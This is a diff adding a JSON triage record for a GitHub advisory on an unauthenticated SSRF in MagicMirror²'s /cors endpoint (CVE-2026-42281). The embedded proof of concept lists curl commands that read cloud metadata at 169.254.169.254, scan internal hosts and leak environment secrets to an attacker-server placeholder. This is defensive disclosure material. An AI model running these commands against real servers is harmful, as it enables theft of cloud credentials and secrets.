@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/43656486?v=4\", \"events_url\": \"https://api.github.com/users/Astaruf/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Astaruf/followers\", \"following_url\": \"https://api.github.com/users/Astaruf/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Astaruf/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Astaruf\", \"id\": 43656486, \"login\": \"Astaruf\", \"node_id\": \"MDQ6VXNlcjQzNjU2NDg2\", \"organizations_url\": \"https://api.github.com/users/Astaruf/orgs\", \"received_events_url\": \"https://api.github.com/users/Astaruf/received_events\", \"repos_url\": \"https://api.github.com/users/Astaruf/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Astaruf/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Astaruf/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Astaruf\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-42281\", \"cvss\": {\"score\": 8.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 9.2, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"### Summary\\n\\nAn unauthenticated Server-Side Request Forgery (SSRF) vulnerability in the `/cors` endpoint allows any remote attacker to force the MagicMirror² server to perform arbitrary HTTP requests to internal networks, cloud metadata services, and localhost services. The endpoint also expands environment variable placeholders (`**VAR_NAME**`), enabling exfiltration of server-side secrets.\\n\\n### Details\\n\\nThe `/cors` endpoint in `js/server_functions.js` (function `cors()`, lines 37-78) acts as an open HTTP proxy with no authentication and no URL validation. Any user-supplied URL is fetched server-side via `fetch()` and the full response is returned to the caller.\\n\\nAdditionally, the `replaceSecretPlaceholder()` function (lines 21-25) expands any `**VARIABLE_NAME**` pattern in the URL with the corresponding `process.env` value before the request is made, allowing an attacker to exfiltrate environment variables (e.g. API keys, tokens, database credentials).\\n\\n**Vulnerable code path:**\\n\\n```\\nGET /cors?url=<attacker-controlled-url>\\n  → replaceSecretPlaceholder(url)     // expands **ENV_VAR** → process.env.ENV_VAR\\n  → fetch(url)                        // no validation, no blocklist\\n  → response returned to attacker     // full body, status, headers\\n```\\n\\n**Key issues:**\\n- No authentication required\\n- No URL validation or blocklist for private/reserved IP ranges\\n- No restriction on URL scheme or destination\\n- Environment variable expansion in URL before fetch\\n\\n### PoC\\n\\n**Prerequisites:** a running MagicMirror² instance accessible on the network (default: `http://<host>:8080`).\\n\\n**1. Basic SSRF — access cloud metadata (AWS IMDSv1):**\\n\\n```\\ncurl \\\"http://<target>:8080/cors?url=http://169.254.169.254/latest/meta-data/\\\"\\n```\\n\\nIf the server runs on AWS EC2 without IMDSv2 enforcement, this returns instance metadata including IAM role credentials.\\n\\n**2. Internal network scanning:**\\n\\n```\\ncurl \\\"http://<target>:8080/cors?url=http://192.168.1.1/\\\"\\ncurl \\\"http://<target>:8080/cors?url=http://127.0.0.1:3000/\\\"\\n```\\n\\nThe attacker can probe internal services by observing response status codes and timing.\\n\\n**3. Environment variable exfiltration:**\\n\\n```\\ncurl \\\"http://<target>:8080/cors?url=http://<attacker-server>/?leak=**SECRET_API_KEY**\\\"\\n```\\n\\nThe server expands `**SECRET_API_KEY**` to the value of `process.env.SECRET_API_KEY` before making the request, sending the secret to the attacker-controlled server as a query parameter.\\n\\n### Impact\\n\\n- **Cloud deployments (AWS/GCP/Azure):** full compromise of cloud instance credentials via metadata service (169.254.169.254), potentially leading to lateral movement within the cloud account\\n- **Internal network access:** the server becomes a proxy to scan and interact with services on internal networks that are not directly reachable by the attacker\\n- **Secret exfiltration:** environment variables containing API keys, database credentials, or other sensitive configuration are directly readable\\n- **Affected users:** anyone running MagicMirror² exposed to an untrusted network (including LAN). The `/cors` endpoint requires no authentication, so any host that can reach the MagicMirror HTTP port can exploit this vulnerability\", \"epss\": {\"percentage\": 0.01623, \"percentile\": 0.72999}, \"ghsa_id\": \"GHSA-ph6f-2cvq-79hq\", \"github_reviewed_at\": \"2026-05-05T20:53:59Z\", \"html_url\": \"https://github.com/advisories/GHSA-ph6f-2cvq-79hq\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-ph6f-2cvq-79hq\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-42281\"}], \"nvd_published_at\": \"2026-05-14T16:16:21Z\", \"published_at\": \"2026-05-05T20:53:59Z\", \"references\": [\"https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-ph6f-2cvq-79hq\", \"https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.36.0\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-42281\", \"https://github.com/advisories/GHSA-ph6f-2cvq-79hq\"], \"repository_advisory_url\": \"https://api.github.com/repos/MagicMirrorOrg/MagicMirror/security-advisories/GHSA-ph6f-2cvq-79hq\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/MagicMirrorOrg/MagicMirror\", \"summary\": \"MagicMirror vulnerable to unauthenticated SSRF via /cors endpoint\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:14:14Z\", \"url\": \"https://api.github.com/advisories/GHSA-ph6f-2cvq-79hq\", \"vulnerabilities\": [{\"first_patched_version\": \"2.36.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"magicmirror\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 2.35.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-ph6f-2cvq-79hq",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "magicmirror: <= 2.35.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-42281"
+    ],
+    "cvss_score": 8.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "magicmirror"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.243439Z",
+  "provenance": {
+    "content_sha256": "087105eb7b3df166658eac7b41579184f910436c08ebb788f58d12386392dc5b",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-05T20:53:59Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-ph6f-2cvq-79hq",
+  "status": "active",
+  "title": "MagicMirror vulnerable to unauthenticated SSRF via /cors endpoint",
+  "updated_at": "2026-06-08T23:14:14Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-ph6f-2cvq-79hq"
+}
